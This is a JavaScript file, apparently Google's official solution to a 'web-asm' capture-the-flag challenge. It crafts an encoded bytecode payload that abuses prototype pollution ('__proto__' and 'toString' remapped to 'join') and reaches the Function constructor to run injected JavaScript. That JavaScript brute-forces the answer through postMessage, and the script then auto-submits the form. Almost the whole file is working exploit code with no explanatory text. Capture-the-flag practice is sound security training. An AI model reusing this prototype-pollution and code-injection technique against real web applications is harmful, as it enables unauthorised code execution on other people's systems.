// Copyright 2018 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//      http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.



/**
 * @fileoverview Solution for the web-asm challenge.
 */

function encodeString(str) {
   return [].concat.apply(Array.from(new Uint8Array(new Uint32Array([str.length]).buffer)),[].concat.apply(str.split('').map(c=>[c.charCodeAt(),0])));
}
var ex = new Uint8Array([].concat([
    4,0,0,0,                            // offset to 4 (skip offset)
    0,0,0,8],encodeString(`for(i=0;i<127;i++)postMessage({answer:String.fromCharCode(i),counters:{cycles:0},test:{toString:0}})`),[ // mov 0,"alert(1)"
    0,8],encodeString("toString"),
         [128+8],encodeString("join"),[ // mov "toString",&"join"
    0,8],encodeString("__proto__"),
         [128+8],encodeString(
                       "join"),[        // mov "__proto__",&"join"
    0,8],encodeString("Function"),
         [128+8],encodeString(
                       "constructor"),[ // mov "Function",&"constructor"
    0,8],encodeString("length"),[0,1,   // mov "length",1
    0,0,101,128+8],
         encodeString("Function"),[     // mov 101,&"Function"
]));
var padding = 4 - ex.byteLength % 4;
program.value=(
    Array.from(new Uint8Array(
        [].concat(
            Array.from(ex),
            new Array(padding + 1).join('0').split('').map(num=>parseInt(num))
        )
    )).join(',')
);
document.forms[0].submit();
